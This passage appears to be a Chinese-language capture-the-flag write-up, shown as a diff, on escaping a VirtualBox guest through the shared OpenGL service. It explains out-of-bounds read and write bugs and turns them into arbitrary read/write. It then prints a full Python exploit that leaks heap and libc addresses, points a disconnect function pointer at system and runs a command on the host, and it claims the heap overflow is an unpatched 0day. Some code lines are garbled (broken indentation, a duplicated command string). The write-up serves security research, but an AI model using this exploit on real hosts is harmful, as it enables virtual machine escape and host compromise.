@@ -1,0 +1,146 @@
+        const char *name = DATA_POINTER(12, const char);
+        SET_RETURN_PTR(packet_length-16);
+        SET_WRITEBACK_PTR(packet_length-8);
+        cr_unpackDispatch.GetUniformLocation(program, name);
+    }
+漏洞的成因完全与CVE-2018-3055相同，简单来说SET_RETURN_PTR和SET_WRITEBACK_PTR指向的内存会写回到guest，而这里因为没有对packet_length做对应的检查导致我们可以在堆上实现越界读。
+### **漏洞利用**
+通过以上的代码分析，我们现在有一个堆越界读和一个堆越界写，接下来我们来分析如何去完成完整的漏洞利用。
+因为信息泄露部分完全与CVE-2018-3055基本相同，我们选择直接复用niklasb之前的exp
+leak部分的代码。重写make_oob_read后通过leak_stuff我们可以泄露一个CRConnection结构体的位置，而niklasb的exp中就是通过修改pHostBuffer和cbHostBuffer来实现任意地址读。因此，当我们有任意地址写的条件之后我们就可以任意地址读了。
+接下来的关键就是如何用我们神奇的堆溢出来实现任意地址写了。@kelwin找到了一个很好用的结构体CRVBOXSVCBUFFER_t，也就是niklasb的代码中alloc_buf使用的结构体：
+    typedef struct _CRVBOXSVCBUFFER_t {
+        uint32_t uiId;
+        uint32_t uiSize;
+        void*    pData;
+        _CRVBOXSVCBUFFER_t *pNext, *pPrev;
+    } CRVBOXSVCBUFFER_t;
+如果可以在堆上我们可以越界写的内存后面恰好布置这样一个结构体，越界写它对应的uiSize部分，再通过SHCRGL_GUEST_FN_WRITE_BUFFER就可以越界写这个buffer所对应的pData的内容，之后再越界写另一个相同的结构体，就可以实现任意地址写了。实现任意地址写的具体过程如下：
+  1. n次调用alloc_buf，对应的buffer填充为可以触发越界写的部分，从而确保在我们可以越界写的堆后有可用的CRVBOXSVCBUFFER_t结构体。此时内存分布如下：
+  2. 通过SHCRGL_GUEST_FN_WRITE_READ使用第n-3个buffer，触发堆越界写，覆盖掉第n-2个buffer的size部分。此时内存分布如下：
+  3. 通过SHCRGL_GUEST_FN_WRITE使用第n-2个buffer，触发堆越界写，可以修改第n-1个buffer的uiSize和pData为任意值。此时内存分布如下：
+  4. 通过SHCRGL_GUEST_FN_WRITE使用第n-1个buffer，触发任意地址写，写的地址与长度由步骤3控制
+  5. 多次任意地址写可以通过多次反复SHCRGL_GUEST_FN_WRITE第n-2个buffer和第n-1个buffer实现
+在有了任意读和任意写的能力之后，我们可以修改某个CRConnection结构体中disconnect函数指针来劫持rip，通过修改CRConnection头部的数据可以控制对应的参数。所以漏洞利用的完整过程如下：
+  1. 通过越界读泄露一个CRConnection结构体的位置
+  2. 配置内存实现任意地址写
+  3. 通过任意地址读泄露CRConnection结构体中alloc函数对应地址
+  4. 通过alloc函数地址计算VBoxOGLhostcrutil.so库地址，最终泄露libc地址
+  5. 修改CRConnection的disconnect函数指针为system
+  6. 修改CRConnection的头部为payload
+  7. disconnect对应的client
+完整exp：
+    #!/usr/bin/env python2
+    from __future__ import print_function
+    import os, sys
+    from array import array
+    from struct import pack, unpack
+    sys.path.append(os.path.abspath(os.path.dirname(__file__)) + '/lib')
+    from chromium import *
+    from hgcm import *
+    def make_oob_read(offset):
+        return (
+            pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
+            + '\0\0\0' + chr(CR_EXTEND_OPCODE)
+            + pack("<I", offset)
+            + pack("<I", CR_GETUNIFORMLOCATION_EXTEND_OPCODE)
+            + pack("<I", 0)
+            + 'LEET'
+            )
+    def leak_conn(client):
+        ''' Return a CRConnection address, and the associated client handle '''
+        # Spray some buffers of sizes
+        #  0x290 = sizeof(CRConnection) and
+        #  0x9d0 = sizeof(CRClient)
+        for _ in range(600):
+            alloc_buf(client, 0x290)
+        for _ in range(600):
+            alloc_buf(client, 0x9d0)
+        # This will allocate a CRClient and CRConnection right next to each other.
+        new_client = hgcm_connect("VBoxSharedCrOpenGL")
+        for _ in range(2):
+            alloc_buf(client, 0x290)
+        for _ in range(2):
+            alloc_buf(client, 0x9d0)
+        hgcm_disconnect(new_client)
+        # Leak pClient member of CRConnection struct, and from that compute
+        # CRConnection address.
+        msg = make_oob_read(OFFSET_CONN_CLIENT)
+        leak = crmsg(client, msg, 0x290)[16:24]
+        pClient, = unpack("<Q", leak[:8])
+        pConn = pClient + 0x9e0
+        new_client = hgcm_connect("VBoxSharedCrOpenGL")
+        set_version(new_client)
+        return new_client, pConn, pClient
+    class Pwn(object):
+        def write(self, where, what):
+            pay = 'A'*8+pack("<Q",where)
+            buf,_,_,_=hgcm_call(self.client1,13,[self.write_buf,self.write_buf_size,0x40,pay])
+            hgcm_call(self.client1,13,[0x41414141,0x41414141,0,what])
+        def write64(self, where, what):
+            self.write(where, pack("<Q", what))
+        def read(self, where, n, canfail=False):
+            # Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.
+            self.write64(self.pConn + OFFSET_CONN_HOSTBUF, where)
+            self.write64(self.pConn + OFFSET_CONN_HOSTBUFSZ, n)
+            res, sz = hgcm_call(self.client3, SHCRGL_GUEST_FN_READ, ["A"*0x1000, 0x1000])
+            if canfail and sz != n:
+                return None
+            assert sz == n
+            return res[:n]
+        def read64(self, where, canfail=False):
+            leak = self.read(where, 8, canfail)
+            if not leak:
+                return None
+            return unpack('<Q', leak)[0]
+        def leak_stuff(self):
+            self.client1 = hgcm_connect("VBoxSharedCrOpenGL")
+            set_version(self.client1)
+            self.client2 = hgcm_connect("VBoxSharedCrOpenGL")
+            set_version(self.client2)
+            # TODO maybe spray even more?
+            for _ in range(3):
+                for _ in range(400): alloc_buf(self.client1, 0x290)
+                for _ in range(400): alloc_buf(self.client1, 0x9d0)
+                for _ in range(600): alloc_buf(self.client1, 0x30)
+            # self.master_id, self.master, _ = leak_buf(self.client1)
+            # print('[*] Header for buffer # %d is at 0x%016x (master)' % (self.master_id, self.master))
+            # self.victim_id, self.victim, _ = leak_buf(self.client1)
+            # print('[*] Header for buffer # %d is at 0x%016x (victim)' % (self.victim_id, self.victim))
+            self.client3, self.pConn, _ = leak_conn(self.client1)
+            print('[*] Leaked CRConnection @ 0x%016x' % self.pConn)
+        def setup_write(self):
+            msg = pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1) \
+                  + '\0\0\0' + chr(CR_EXTEND_OPCODE) \
+                  + 'aaaa' \
+                  + pack("<I", CR_SHADERSOURCE_EXTEND_OPCODE) \
+                  + pack("<IIIII", 0, 0x2, 0, 0x1, 0x1a+2) +'A'*4
+            bufs = []
+            for i in range(0x1000):
+                    bufs.append(alloc_buf(self.client1, len(msg), msg))
+            _, res, _ = hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [bufs[-5], "A"*0x50, 0x50])
+            self.write_buf = 0x0a0a0000+bufs[-4];
+            self.write_buf_size = 0x0a0a30;
+        def setup(self):
+            self.leak_stuff()
+            self.setup_write()
+            self.crVBoxHGCMFree = self.read64(self.pConn + OFFSET_CONN_FREE, canfail=True)
+            print('[*] Leaked crVBoxHGCMFree @ 0x%016x' % self.crVBoxHGCMFree)
+            libbase = self.crVBoxHGCMFree - 0x20650
+        self.system = self.read64(libbase + 0x22e3d0, canfail=True) - 0x122ec0 + 0x4f440 
+        print('[*] Leaked system @ 0x%016x' % self.system)
+            self.write64(self.pConn + 0x128, self.system)
+            self.write(self.pConn, "mousepad /home/c3mousepad /home/c3ctf/Desktop/flag.txt\x00")
+            '''
+            self.write64(self.pConn + OFFSET_CONN_HOSTBUF, self.writer_msg)
+            hgcm_disconnect(self.client1)
+            '''
+            return
+    if __name__ == '__main__':
+        p = Pwn()
+        p.setup()
+        #if raw_input('you want RIP control? [y/n] ').startswith('y'):
+        #    p.rip(0xdeadbeef)
+### **仍然存在的0day**
+Virtualbox官方在2019.1.11修补了两处类似的信息泄露部分，对于堆溢出部分的内容仍然没有修补，导致该漏洞仍然可以被利用。接下来看一下如何只使用堆溢出部分的内容来实现完整逃逸。
+### **从一个堆溢出到弹计算器**
